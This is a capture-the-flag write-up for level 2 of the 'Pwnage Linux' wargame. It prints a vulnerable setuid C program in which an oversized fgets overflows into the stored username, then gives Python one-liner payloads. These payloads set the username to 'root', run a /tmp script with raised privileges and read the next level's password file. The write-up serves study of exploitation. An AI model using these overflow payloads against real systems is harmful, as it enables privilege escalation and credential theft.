Pwnage Linux level 2/15 Writeup

This time, let's start from the source (which you can find in /levels/level2.c):

"
// Created by Hidden (hidden@undernet.org)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct USER {
	int id;
	char name[32];
	char pass[32];
} u = { 0, "nobody", "Ksdkjkk32avsh" };



int main(int argc, char **argv)
{
	char user[32];
	char pass[32];
	char command[64];
	char *shell[] = { command, 0 };
	char *p;

	printf("Username: ");
	fgets(user, 31, stdin);
	p = strchr(user, '\n');
	if (p)
		*p = '\0';
	if (strcmp(user, u.name))
		return 0;
	printf("Password: ");
	fgets(pass, 31, stdin);
	p = strchr(pass, '\n');
	if (p)
		*p = '\0';
	if (strcmp(pass, u.pass))
		return 0;
	printf("Command: ");
	if (fgets(command, 128, stdin) == NULL)
		return 0;
	p = strchr(command, '\n');
	if (p)
		*p = '\0';
	if (!strcmp(user, "root")) {
		printf("Good job!\n");
		setresuid(geteuid(), geteuid(), geteuid());
		execve(shell[0],shell,0);
	}
	else {
		printf("Okay Mr. %s. Dropping priviledges though.\n", user);
		setreuid(getuid(), getuid());
		execve(shell[0],shell,0);
	}
	return 0;
}
"

And let's break all into steps:

first thing, we get a login prompt, for which we already know the credentials
so, no big deal for now.

Then, the program asks for a command and then again it checks the username one more time:
if the user is root, it execs command as level3 (which is what we aim for). 
But if we logged in as nobody (and it's the only way the program steps beyond the checks) how
can we be root?

Well, the pwnage is here: user and pass are located on the stack, before (or above, if you like it more)
command, which, thanks to a ill sized fgets, can overflow over them.
So, let's do it:

"
level2@rzt-bin01:/levels$ python -c "print 'nobody\nKsdkjkk32avsh\n' + 'A'*96 + 'root'" | ./level2
Username: Password: Command: Good job!
"

Well, we can now be nobody and become root just when it's needed, good.

But we still need to execute a command (remember, the target is in /home/level3/.pass).
To do this, we need to keep in mind that our actual command will be read from the start
of command and our new user (root) will be at the and of it, overflowed to 96 characters.
One other important thing is that in both cases we'll need clean, null-terminated strings,
to avoid reading garbage past the end and, well, because execve is a picky bitch.
Luckily for us, fgets, unlike e.g. strcpy, will happily keep reading beyond zero bytes.

After some trial and error, although it's possible to get some basic command executed
keeping the overflow working, it will be clear soon enough that everything more complex
is going to fail, so, most likely, the best thing to do would be to move the real action
into a script (maybe in the world writable /tmp) and, then, just call it from command,
let's try it:

"
level2@rzt-bin01:/levels$ python -c "print 'nobody\nKsdkjkk32avsh\n' + '/tmp/script.sh\x00' + 'A'* 81 + 'root\x00'" | ./level2
Username: Password: Command: Good job!
b130hOOfGftXUfmRZlgD
"

And here's level3 password.

